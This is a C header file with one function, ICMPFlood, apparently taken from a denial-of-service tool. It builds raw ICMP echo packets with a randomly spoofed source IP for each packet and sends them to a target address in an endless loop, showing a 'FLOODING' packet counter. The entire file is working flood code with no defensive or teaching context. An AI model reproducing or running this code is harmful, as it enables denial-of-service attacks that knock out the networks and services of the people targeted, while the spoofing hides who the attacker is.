#ifndef ICMP_HEADER
#define ICMP_HEADER

//ICMP Flood
void ICMPFlood()
{
    //Set-up Time Logger
    time_t t_log = time(NULL);
    struct tm tm = *localtime(&t_log);

    //Declaring Datagram and Source IP Variables
    char datagram[4096], source_ip[32];
    int payload_size = 0, sent_size = 0;
     
    //Calculate total packet size
    int packet_size = sizeof(struct iphdr) + sizeof(struct icmphdr) + payload_size;
    char* packet = (char*)malloc(packet_size);
                    
    if (!packet) 
    {
        t_log = time(NULL);
        tm = *localtime(&t_log);
        printf("%s [%02d:%02d:%02d] [%sERROR%s] Out Of Memory.\n", COLOR_WHITE, tm.tm_hour, tm.tm_min, tm.tm_sec, COLOR_RED, COLOR_NORMAL);
    }
     
    //IP Header
    struct iphdr* ip_header = (struct iphdr*)packet;
    struct icmphdr* icmp_header = (struct icmphdr*)(packet + sizeof(struct iphdr));
     
    //Zero out the Buffer
    memset(packet, 0, packet_size);
 
    ip_header->version = 4;
    ip_header->ihl = 5;
    ip_header->tos = 0;
    ip_header->tot_len = htons(packet_size);
    ip_header->id = htons(1);
    ip_header->frag_off = 0;
    ip_header->ttl = 255;
    ip_header->protocol = IPPROTO_ICMP;
    ip_header->saddr = inet_addr(source_ip); //Spoof the Source IP Address
    ip_header->daddr = inet_addr(target_ip);
 
    switch (attack_mode)
    {
        case 1:
        icmp_header->type = 8;
            break;
        case 2:
        icmp_header->type = 0;
            break;
        default:
        icmp_header->type = 8;
            break;
    }
 
    icmp_header->code = 0;
    icmp_header->un.echo.sequence = 0;
    icmp_header->un.echo.id = 0;

    //Checksum
    icmp_header->checksum = 0;
     
    struct sockaddr_in servaddr;
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr(target_ip);
    memset(&servaddr.sin_zero, 0, sizeof(servaddr.sin_zero));
     
    int one = 1;
    const int* val = &one;

    int f1 = 0, f2 = 0, f3 = 0, f4 = 0, new_port = 0;
    char new_source_ip[32];

    while (1)
    {
        //Creating RAW Socket
        int skt = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

        if (skt == -1)
        {
            t_log = time(NULL);
            tm = *localtime(&t_log);
            printf("%s [%02d:%02d:%02d] [%sERROR%s] Could Not Create Socket.\n", COLOR_WHITE, tm.tm_hour, tm.tm_min, tm.tm_sec, COLOR_RED, COLOR_NORMAL);
            exit(0);
        }

        if (setsockopt(skt, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
        {
            t_log = time(NULL);
            tm = *localtime(&t_log);
            printf("%s [%02d:%02d:%02d] [%sERROR%s] Error While Setting IP_HDRINCL. Error number : %d . Error message : %s \n", COLOR_WHITE, tm.tm_hour, tm.tm_min, tm.tm_sec, COLOR_RED, COLOR_NORMAL, errno, strerror(errno));
            close(skt);
            exit(0);
        }

        RandomIP(&f1, &f2, &f3, &f4, &new_port); //Generate the new Spoofed IP and Port
        sprintf(new_source_ip, "%d.%d.%d.%d", f1, f2, f3, f4);
        
        strcpy(source_ip, new_source_ip); //Copy new generated IP into previous IP
        ip_header->saddr = inet_addr(source_ip); //Spoof the Source IP address
         
        icmp_header->un.echo.sequence = rand() % 4294967294; //Randomize Sequence
        icmp_header->un.echo.id = htons(rand() % 65535); //Randomize ID
        
        //Randomize ICMP Payload 
        memset(packet + sizeof(struct iphdr) + sizeof(struct icmphdr), rand() % 255, payload_size);
        
    	ip_header->id = htons(rand() % 65535);
        icmp_header->checksum = 0;
        icmp_header->checksum = Checksum((unsigned short*)icmp_header, sizeof(struct icmphdr) + payload_size);
         
        if ((sent_size = sendto(skt, packet, packet_size, 0, (struct sockaddr*)&servaddr, sizeof(servaddr))) < 0) 
        {
            t_log = time(NULL);
            tm = *localtime(&t_log);
            printf("%s [%02d:%02d:%02d] [%sERROR%s] Send Failed.\n", COLOR_WHITE, tm.tm_hour, tm.tm_min, tm.tm_sec, COLOR_RED, COLOR_NORMAL);
            break;
        }
         
        printf("\r %s[%sFLOODING%s] Sent %d %sPackets...", COLOR_WHITE, COLOR_RED, COLOR_WHITE, packet_count, COLOR_WHITE);
        fflush(stdout);
        packet_count++;
        usleep(1);
    	close(skt);
    }
}

#endif
